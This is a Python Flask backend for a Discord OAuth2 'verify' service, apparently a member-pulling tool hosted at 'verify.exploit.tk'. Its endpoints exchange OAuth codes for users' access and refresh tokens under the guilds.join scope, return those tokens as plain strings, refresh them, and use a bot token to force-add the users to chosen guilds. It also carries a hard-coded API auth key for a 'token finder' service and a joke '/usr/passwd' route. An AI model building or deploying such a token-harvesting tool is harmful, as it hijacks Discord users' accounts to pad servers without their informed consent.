# https://canary.discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join

import os
# os.system("pip install dhooks")
import json, requests
from dhooks import Webhook, File
from flask import Flask, redirect, url_for, request, jsonify, logging
import pymongo
import urllib.parse

app = Flask('')

# log = logging.getLogger('werkzeug')
# log.setLevel(logging.ERROR)

verified_redirect = ""
verifier_redir = "https://discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join"
hook = ""
error_hook = ""
tkn = ""
API_ENDPOINT = 'https://canary.discord.com/api/v9'
CLIENT_ID = '994684314010796083'
CLIENT_SECRET = ""
REDIRECT_URI = 'https://verify.exploit.tk'  #
TOKEN_FINDER_API = "https://"
TOKEN_FINDER_API_AUTH = "02ab23b5df4ff52f46320e92d7"
backup_hook = ""
pwd = ""
mongopass = ""

username = urllib.parse.quote_plus('exploit')
password = urllib.parse.quote_plus(mongopass)
# uri = "" % (username, password)
# conn = pymongo.MongoClient(uri)

def exchange_code(code:str, secret:str, id:str, redirect:str):
  data = {
    'client_id': id,
    'client_secret': secret,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': redirect
  }
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  r = requests.post(str(API_ENDPOINT) + '/oauth2/token',
                    data=data,
headers=headers)
  if r.status_code == 429:
    content = f"https://{redirect}/?code=%s" % code
    r = requests.post(
  error_hook, json={ "content": content })
    os.system("kill 1")
  print(r.status_code)
  print(r.text)
  if r.status_code in (200, 201, 204):
    print(r.json())
    return r.json()
  else:
    return False


def add_to_guild(access_token, userID, guild_Id, tk):
  url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"

  botToken = tk
  data = {
    "access_token": access_token,
  }
  headers = {
    "Authorization": f"Bot {botToken}",
    'Content-Type': 'application/json'
  }
  r = requests.put(url=url, headers=headers, json=data)
  print(r.status_code)
  print(r.text)
  # endp = "https://canary.discord.com/api/v9/users/@me"
  # r = requests.get(endp, headers={"Authorization": f"Bearer {access_token}"})
  # rjson = r.json()

  # content = f">>> new user authed\n\nID: `{userID}`\nMention:<@{userID}>\nIP: `{ip}`\nUserAgent: `{ua}`\n\nData: `{rjson}`"
  # r = requests.post(
  # hook, json={ "content": content })
  # r = requests.put(
  #   f"https://canary.discord.com/api/v9/guilds/952495772073619466/members/{userID}/roles/988815859814383648",
  #   headers={"Authorization": f"Bot {tkn}"})
  return r.status_code

  
def get_user(access: str):
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={"Authorization": f"Bearer {access}"})
  rjson = r.json()
  return rjson['id']


def get_new_token(refresh, idxd, secret):
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  data = {
    'client_id': idxd,
    'client_secret': secret,
    'grant_type': 'refresh_token',
    'refresh_token': refresh
  }
  r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
  print(r.status_code)
  print(r.text)
  if r.status_code in (200, 201, 204):
    return r.json()
  return "failed"

        
@app.route("/pull", methods = ["get"])
def pullsingle():
  jsonxd = request.json 
  user = jsonxd["user"]
  access = jsonxd["access"]
  guild = jsonxd["guild"]
  tk = jsonxd["tk"]
  print(access)
  add_to_guild(access, user, guild, tk)
  return "ok"
  

@app.route("/refresh", methods = ["put"])
def refreshsingle():
  jsonxd = request.json 
  user = jsonxd["user"]
  refreshxd = jsonxd["refresh"]
  print(refreshxd)
  secret = jsonxd["secret"]
  print(secret)
  idxd = jsonxd["id"]
  print(idxd)
  r = get_new_token(refreshxd, idxd, secret)
  if r == "failed":
    return "failed"
  access = r["access_token"]
  refresh = r["refresh_token"]
  ok = f"{user}:{access}:{refresh}"
  return ok
  return "success"
  
  
@app.route("/members", methods = ['GET'])
def members():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  access = open("database.txt").readlines()
  # access = json.loads(access)
  return str(len(access))

    
@app.route("/check", methods = ['get'])
def check():
  jsonxd = request.json
  access = jsonxd['access']
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={"Authorization": f"Bearer {access}"})
  rjson = r.json()
  print(rjson)
  return "entry found: \n\n%s" % (rjson)
  

    
@app.route('/usr/passwd')
def hello_world():
    ip_addr = request.remote_addr
    return "trolled" 

@app.route('/')
def process_jsonxd():
  return "exploit#1337, server running on port 1337"
  
@app.route('/k')
def process_json():
  jsonxd = request.json
  code = jsonxd['code']
  secret = jsonxd['secret']
  id = jsonxd['id']
  redirect = jsonxd['redirect']
  if len(code) < 30:
    return "invalid query"
  try:
    exchange = exchange_code(code, secret, id, redirect)
    if exchange == False:
      return "False"
    access_tk = exchange['access_token']
    refresh_tk = exchange['refresh_token']
    userid = get_user(access_tk)
    return f"{userid}:{access_tk}:{refresh_tk}"
  except:
    return "ok"


if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
